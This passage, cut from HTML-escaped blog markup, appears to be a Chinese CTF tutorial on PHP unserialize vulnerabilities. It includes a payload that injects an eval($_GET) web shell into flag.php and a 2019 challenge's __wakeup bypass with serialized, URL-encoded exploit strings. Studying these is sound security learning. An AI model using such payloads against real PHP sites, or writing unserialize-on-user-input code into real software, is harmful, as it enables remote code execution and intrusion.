&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$a = $_GET[&amp;#x27;id&amp;#x27;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;print_r($a);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;echo &amp;quot;&amp;lt;/br&amp;gt;&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$a_unser = unserialize($a);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;require &amp;quot;flag.php&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;?&amp;gt;     &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pyload:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;?id=O:4:&amp;quot;test&amp;quot;:1:&amp;#123;s:4:&amp;quot;test&amp;quot;;s:27:&amp;quot;&amp;lt;?php eval($_GET[&amp;#x27;sb&amp;#x27;]); ?&amp;gt;&amp;quot;;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;payload:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;class test&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    var $test = &amp;quot;&amp;lt;?php eval($_GET[&amp;#x27;sb&amp;#x27;]); ?&amp;gt;&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$test = new test();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;echo serialize($test);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;blockquote&gt;
&lt;p&gt;通过调用魔术方法__wakeup 将 $test 的值写入 flag.php 文件中，当调用 unserialize () 反序列化操作时会触发__wakeup 魔术方法，接下来就需要构造传进去的 payload&lt;/p&gt;
&lt;p&gt;在执行 unserialize () 方法时会触发__wakeup () 方法执行，将传入的字符串反序列化后，会替换掉 test 类里面 $test 变量的值，将 php 探针写入 flag.php 文件中，并通过下面的 require 引用，导致命令执行。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h4 id=&#34;0x03-__wakeup绕过&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#0x03-__wakeup绕过&#34;&gt;#&lt;/a&gt; 0x03 __wakeup () 绕过&lt;/h4&gt;
&lt;p&gt;极客大挑战 2019 PHP&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;//index.php&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;class.php&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;variable&#34;&gt;$select&lt;/span&gt; = &lt;span class=&#34;variable&#34;&gt;$_GET&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;select&amp;#x27;&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;variable&#34;&gt;$res&lt;/span&gt;=&lt;span class=&#34;title function_ invoke__&#34;&gt;unserialize&lt;/span&gt;(@&lt;span class=&#34;variable&#34;&gt;$select&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;//class.php&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;flag.php&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;title function_ invoke__&#34;&gt;error_reporting&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;Name&lt;/span&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;private&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$username&lt;/span&gt; = &lt;span class=&#34;string&#34;&gt;&amp;#x27;nonono&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;private&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$password&lt;/span&gt; = &lt;span class=&#34;string&#34;&gt;&amp;#x27;yesyes&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;__construct&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$username&lt;/span&gt;,&lt;span class=&#34;variable&#34;&gt;$password&lt;/span&gt;&lt;/span&gt;)&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable language_&#34;&gt;$this&lt;/span&gt;-&amp;gt;username = &lt;span class=&#34;variable&#34;&gt;$username&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable language_&#34;&gt;$this&lt;/span&gt;-&amp;gt;password = &lt;span class=&#34;variable&#34;&gt;$password&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;__wakeup&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;&lt;/span&gt;)&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable language_&#34;&gt;$this&lt;/span&gt;-&amp;gt;username = &lt;span class=&#34;string&#34;&gt;&amp;#x27;guest&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;__destruct&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;&lt;/span&gt;)&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (&lt;span class=&#34;variable language_&#34;&gt;$this&lt;/span&gt;-&amp;gt;password != &lt;span class=&#34;number&#34;&gt;100&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;lt;/br&amp;gt;NO!!!hacker!!!&amp;lt;/br&amp;gt;&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;You name is: &amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;variable language_&#34;&gt;$this&lt;/span&gt;-&amp;gt;username;&lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;lt;/br&amp;gt;&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;You password is: &amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;variable language_&#34;&gt;$this&lt;/span&gt;-&amp;gt;password;&lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;lt;/br&amp;gt;&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;die&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (&lt;span class=&#34;variable language_&#34;&gt;$this&lt;/span&gt;-&amp;gt;username === &lt;span class=&#34;string&#34;&gt;&amp;#x27;admin&amp;#x27;&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;global&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$flag&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$flag&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;lt;/br&amp;gt;hello my friend~~&amp;lt;/br&amp;gt;sorry i can&amp;#x27;t give you the flag!&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;die&lt;/span&gt;();            &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;payload:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;Name&lt;/span&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;private&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$username&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;private&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$password&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;__construct&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$username&lt;/span&gt;,&lt;span class=&#34;variable&#34;&gt;$password&lt;/span&gt;&lt;/span&gt;)&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable language_&#34;&gt;$this&lt;/span&gt;-&amp;gt;username = &lt;span class=&#34;variable&#34;&gt;$username&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable language_&#34;&gt;$this&lt;/span&gt;-&amp;gt;password = &lt;span class=&#34;variable&#34;&gt;$password&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$a&lt;/span&gt; = &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;Name&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;admin&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;100&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;title function_ invoke__&#34;&gt;serialize&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$a&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;title function_ invoke__&#34;&gt;urlencode&lt;/span&gt;(&lt;span class=&#34;title function_ invoke__&#34;&gt;serialize&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$a&lt;/span&gt;));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;O:&lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;:&lt;span class=&#34;string&#34;&gt;&amp;quot;Name&amp;quot;&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;:&amp;#123;s:&lt;span class=&#34;number&#34;&gt;14&lt;/span&gt;:&lt;span class=&#34;string&#34;&gt;&amp;quot;Nameusername&amp;quot;&lt;/span&gt;;s:&lt;span class=&#34;number&#34;&gt;5&lt;/span&gt;:&lt;span class=&#34;string&#34;&gt;&amp;quot;admin&amp;quot;&lt;/span&gt;;s:&lt;span class=&#34;number&#34;&gt;14&lt;/span&gt;:&lt;span class=&#34;string&#34;&gt;&amp;quot;Namepassword&amp;quot;&lt;/span&gt;;i:&lt;span class=&#34;number&#34;&gt;100&lt;/span&gt;;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;O%&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;A4%&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;A%&lt;span class=&#34;number&#34;&gt;22&lt;/span&gt;Name%&lt;span class=&#34;number&#34;&gt;22&lt;/span&gt;%&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;A2%&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;A%&lt;span class=&#34;number&#34;&gt;7&lt;/span&gt;Bs%&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;A14%&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;A%&lt;span class=&#34;number&#34;&gt;22&lt;/span&gt;%&lt;span class=&#34;number&#34;&gt;00&lt;/span&gt;Name%&lt;span class=&#34;number&#34;&gt;00&lt;/span&gt;username%&lt;span class=&#34;number&#34;&gt;22&lt;/span&gt;%&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;Bs%&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;A5%&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;A%&lt;span class=&#34;number&#34;&gt;22&lt;/span&gt;admin%&lt;span class=&#34;number&#34;&gt;22&lt;/span&gt;%&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;Bs%&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;A14%&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;A%&lt;span class=&#34;number&#34;&gt;22&lt;/span&gt;%&lt;span class=&#34;number&#34;&gt;00&lt;/span&gt;Name%&lt;span class=&#34;number&#34;&gt;00&lt;/span&gt;password%&lt;span class=&#34;number&#34;&gt;22&lt;/span&gt;%&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;Bi%&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;A100%&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;B%&lt;span class=&#34;number&#34;&gt;7&lt;/span&gt;D&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;//其实你这么写也行~&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;Name&lt;/span&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;private&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$username&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;#x27;admin&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;private&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$password&lt;/span&gt;=&lt;span class=&#34;number&#34;&gt;100&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$a&lt;/span&gt; = &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;Name&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;title function_ invoke__&#34;&gt;serialize&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$a&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;title function_ invoke__&#34;&gt;urlencode&lt;/span&gt;(&lt;span class=&#34;title function_ invoke__&#34;&gt;serialize&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$a&lt;/span&gt;));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;O:&lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;:&lt;span class=&#34;string&#34;&gt;&amp;quot;Name&amp;quot;&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;:&amp;#123;s:&lt;span class=&#34;number&#34;&gt;14&lt;/span&gt;:&lt;span 